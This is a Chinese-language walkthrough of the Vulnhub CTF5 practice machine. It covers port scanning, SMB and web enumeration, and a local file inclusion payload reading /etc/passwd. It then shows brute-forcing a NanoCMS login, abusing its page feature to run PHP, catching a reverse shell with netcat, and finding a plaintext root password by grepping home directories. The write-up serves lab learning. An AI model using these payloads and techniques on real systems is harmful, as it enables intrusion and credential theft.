# 靶机信息
CTF5是vulnhub中的一台简单难度的渗透测试靶机

# 靶机初始枚举
tcp端口开放情况
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
└─$ sudo nmap -sT -p$ports -sCV -O $ip -oA nmapScan/detail   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 08:46 EDT
Nmap scan report for 192.168.218.198
Host is up (0.00029s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello [192.168.218.148], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
|_http-title: Phake Organization
|_http-server-header: Apache/2.2.6 (Fedora)
110/tcp   open  pop3        ipop3d 2006k.101
|_ssl-date: 2025-07-30T08:49:39+00:00; -3h58m17s from scanner time.
|_pop3-capabilities: LOGIN-DELAY(180) TOP USER STLS UIDL
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          58416/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_imap-capabilities: BINARY LOGIN-REFERRALS MULTIAPPEND WITHIN THREAD=REFERENCES UNSELECT UIDPLUS IDLE THREAD=ORDEREDSUBJECT SORT MAILBOX-REFERRALS completed CAPABILITY LITERAL+ CHILDREN NAMESPACE SCAN SASL-IR STARTTLSA0001 OK IMAP4REV1 ESEARCH
|_ssl-date: 2025-07-30T08:49:40+00:00; -3h58m17s from scanner time.
445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp  open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 6
|   Capabilities flags: 41516
|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: DgYfxG;/w,t'_-]n4V5F
58416/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:98:E5:38 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Hosts: localhost.localdomain, 192.168.218.198; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2025-07-30T04:48:26-04:00
|_clock-skew: mean: -2h58m16s, deviation: 2h00m00s, median: -3h58m17s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.36 seconds
```

udp开放端口情况
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
└─$ sudo nmap -sU -sCV -p111,5353,32768 --min-rate 1000 192.168.218.198 -oA nmapScan/udpdetail
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 08:49 EDT
Nmap scan report for 192.168.218.198
Host is up (0.00046s latency).

PORT      STATE SERVICE VERSION
111/udp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          58416/tcp   status
5353/udp  open  mdns    DNS-based service discovery
| dns-service-discovery: 
|   9/tcp workstation
|     Address=192.168.218.198 fe80::20c:29ff:fe98:e538
|   22/tcp ssh
|_    Address=192.168.218.198 fe80::20c:29ff:fe98:e538
32768/udp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:98:E5:38 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```


# SMB枚举
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
└─$ smbclient -L //192.168.218.198 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        homes           Disk      Home Directories
        IPC$            IPC       IPC Service (Samba Server Version 3.0.26a-6.fc8)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
```

有个共享目录，但是需要密码，接着看

# WEB枚举

进去主页，也没有搜到什么利用点

<img width="1919" height="1033" alt="Image" src="https://github.com/user-attachments/assets/d15c06b5-3060-4c81-be1f-0a3751bedad1" />

接着爆破一下目录，有很多

```
/inc                  (Status: 301) [Size: 315] [--> http://192.168.218.198/inc/]
/mail                 (Status: 301) [Size: 316] [--> http://192.168.218.198/mail/]
/index.php            (Status: 200) [Size: 1538]
/info.php             (Status: 200) [Size: 50478]
/events               (Status: 301) [Size: 318] [--> http://192.168.218.198/events/]
/phpmyadmin           (Status: 301) [Size: 322] [--> http://192.168.218.198/phpmyadmin/]
/list                 (Status: 301) [Size: 316] [--> http://192.168.218.198/list/]
/squirrelmail         (Status: 301) [Size: 324] [--> http://192.168.218.198/squirrelmail/]
/awstatsicons         (Status: 403) [Size: 294]
/awstatscss           (Status: 403) [Size: 292]
/awstatsclasses       (Status: 403) [Size: 296]
/index.php            (Status: 200) [Size: 1538]
```

events下有登录框，感觉会有利用点，再看看别的

<img width="1919" height="1029" alt="Image" src="https://github.com/user-attachments/assets/007e1ad6-aeb0-44c8-a1db-4ec057ea79f2" />

以及squirrelmail下，也有登录框

<img width="1919" height="1013" alt="Image" src="https://github.com/user-attachments/assets/31ee8dcd-a880-43f6-a8b5-c03b63692a76" />

然后又在主页下翻，切换页面的时候上面有一个page参数，试一下文件包含，`../../../../../etc/passwd%00` 可以利用到漏洞

<img width="1919" height="914" alt="Image" src="https://github.com/user-attachments/assets/dec0f918-3e09-4d15-b220-b32888db693d" />

到管理员登录框，先爆破一下这个

<img width="1908" height="1072" alt="Image" src="https://github.com/user-attachments/assets/b548fc38-216d-468d-abe1-1c65ad1b16f9" />

NanoCMS爆破出了密码，登录进去了
搜索到一个此版本的RCE漏洞，看看能否利用： 
NanoCMS v0.4 在新增页面功能中，允许认证用户上传任意内容，并默认以 .php 后缀保存页面，而未进行任何代码执行防护或内容过滤。

<img width="1919" height="1040" alt="Image" src="https://github.com/user-attachments/assets/fb985246-a330-430d-b315-401a7aee605e" />

成功利用

<img width="1919" height="913" alt="Image" src="https://github.com/user-attachments/assets/1669323b-18be-4a90-86bd-83ca9e15e55e" />

反弹个shell，好像禁用了/dev/tcp，直接写一个php-reverse-shell 上去
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/CTF5]
└─$ sudo nc -lvnp 4444
[sudo] kali 的密码：
listening on [any] 4444 ...
connect to [192.168.218.148] from (UNKNOWN) [192.168.218.198] 60733
Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
 08:00:43 up  3:17,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-3.2$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh-3.2$ uname -a
Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
sh-3.2$ 
```

# 提权
翻找了一会没找到什么横向或纵向的提权
开始尝试使用内核漏洞，经过很久的尝试，都没成功，poc太老了，我也没有修改poc的能力，看一眼wp，发现有正常的路子走。

`grep -rn "password" . 2>/dev/null`

./patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note 文件中有 **root password** 字样
<img width="1601" height="889" alt="Image" src="https://github.com/user-attachments/assets/e71e6f2e-a8e5-4102-860c-842de06df1c8" />

```
head 481bca0d-7206-45dd-a459-a72ea1131329.note 
<?xml version="1.0" encoding="utf-8"?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve"><note-content version="0.1">Root password

Root password

50$cent</note-content></text>
  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
bash-3.2$ 
```
直接就是明文存放 root 密码

# 反思
这个靶机不难，但是攻击面很大，开放端口比较多，容易迷路，最后提权也是万万没想到。